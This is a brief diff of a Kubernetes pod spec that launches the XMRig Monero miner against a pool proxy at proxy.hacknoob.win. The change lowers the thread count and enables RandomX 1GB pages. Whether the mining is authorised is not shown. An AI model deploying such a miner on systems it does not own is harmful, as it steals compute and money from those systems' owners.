@@ -18,7 +18,7 @@ spec:
     command:
     - /home/manager/xmrig/build/xmrig
     - -t
-    - "3"
+    - "2"
     - -o
     - proxy.hacknoob.win:5550
     - -u
@@ -27,6 +27,7 @@ spec:
     - rx/0
     - --cpu-no-yield
     - --nicehash
+    - --randomx-1gb-pages
     volumeMounts:
     - name: xmrig-volume-m
       mountPath: /
